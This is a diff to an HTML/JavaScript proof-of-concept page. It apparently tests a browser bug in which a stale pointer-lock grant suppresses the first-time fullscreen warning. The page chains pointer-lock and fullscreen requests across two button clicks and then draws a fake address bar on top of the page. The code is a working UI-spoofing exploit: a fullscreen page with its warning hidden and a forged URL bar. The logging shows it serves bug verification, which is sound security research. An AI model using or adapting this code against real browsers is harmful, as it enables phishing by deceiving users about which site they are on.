@@ -6,6 +6,8 @@
 <style>
   html, body { margin:0; padding:0; background:#222; color:#0f0; font-family: monospace; }
   #log { white-space: pre-wrap; padding: 16px; font-size: 14px; }
+  button { font-size: 18px; padding: 10px 20px; margin: 12px 16px; }
+  #step2Btn[disabled] { opacity: 0.4; }
   #fakebar {
     position: fixed; top:0; left:0; right:0; height:40px;
     background:#fff; color:#000; display:none;
@@ -13,11 +15,11 @@
     font-size: 14px; box-shadow: 0 1px 3px rgba(0,0,0,.3); z-index: 999999;
   }
   #fakebar.show { display:flex; }
-  #startBtn { font-size: 20px; padding: 12px 24px; margin: 20px; }
 </style>
 </head>
 <body>
-<button id="startBtn">Start demo (click once)</button>
+<button id="step1Btn">Step 1: Lock pointer (watch for the warning bubble)</button>
+<button id="step2Btn" disabled>Step 2: Click here once the bubble is gone (~4s)</button>
 <div id="log"></div>
 
 <div id="fakebar">
@@ -40,36 +42,48 @@ document.addEventListener('fullscreenchange', () => log('fullscreenchange -> ' +
 document.addEventListener('pointerlockerror', () => log('pointerlockerror!'));
 function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
 
-async function run() {
-  log('Step 1: requesting fullscreen + pointer lock (user gesture)');
-  const fsPromise = document.documentElement.requestFullscreen();
-  const plPromise = document.body.requestPointerLock();
-  await Promise.allSettled([fsPromise, plPromise]);
-  log('-> ' + stateSnapshot());
-  log('Bubble "Press Esc to exit full screen and unlock your cursor" should show now.');
-  log('Waiting 4.5s for the 3.8s auto-hide timer...');
-  await sleep(4500);
+const step1Btn = document.getElementById('step1Btn');
+const step2Btn = document.getElementById('step2Btn');
 
-  log('Step 2: bubble should have timed out -> silent-lock permission granted internally.');
-  log('Step 3: self-unlocking pointer...');
+step1Btn.addEventListener('click', async () => {
+  step1Btn.disabled = true;
+  log('=== STEP 1 (by design) =======================================');
+  log('Requesting pointer lock ONLY (no fullscreen). A "Press Esc to exit');
+  log('mouse lock" bubble should appear now and auto-hide in ~3.8s.');
+  await document.body.requestPointerLock();
+  log('-> ' + stateSnapshot());
+  log('Waiting for the bubble to time out...');
+  await sleep(4300);
+  log('Bubble should be gone now (normal timeout).');
+
+  log('Explicitly releasing pointer lock ourselves (document.exitPointerLock()),');
+  log('so this unlock counts as "target-initiated" for the next lock request.');
   document.exitPointerLock();
   await sleep(300);
   log('-> ' + stateSnapshot());
+  log('Click Step 2 when ready.');
+  step2Btn.disabled = false;
+}, { once: true });
 
-  log('Step 4: re-locking pointer (should go silent, no bubble reshow)...');
-  await document.body.requestPointerLock();
-  await sleep(300);
+step2Btn.addEventListener('click', async () => {
+  step2Btn.disabled = true;
+  log('=== STEP 2 (the actual test) ==================================');
+  log('Requesting FULLSCREEN for the first time ever on this page, together');
+  log('with pointer lock, from this fresh click.');
+  const fsPromise = document.documentElement.requestFullscreen();
+  const plPromise = document.body.requestPointerLock();
+  await Promise.allSettled([fsPromise, plPromise]);
+  await sleep(500);
   log('-> ' + stateSnapshot());
-  log('If the bug is real: NO bubble/toast should be visible right now, even though');
-  log('we are still in full screen with the real address bar hidden.');
+  log('');
+  log('QUESTION: did an "entered full screen / Press Esc" bubble or toast');
+  log('appear anywhere on screen just now, for this FIRST-EVER fullscreen entry?');
+  log('- YES, it appeared  -> bug is fixed / not reachable this way.');
+  log('- NO, nothing appeared -> bug confirmed: a stale silent-pointer-lock');
+  log('  grant suppressed the mandatory first-time fullscreen warning.');
 
-  log('Step 5: drawing fake address bar on top.');
   document.getElementById('fakebar').classList.add('show');
-}
-
-document.getElementById('startBtn').addEventListener('click', () => {
-  document.getElementById('startBtn').style.display = 'none';
-  run();
+  log('(Fake address bar now drawn on top, purely to illustrate the payload.)');
 }, { once: true });
 </script>
 </body>
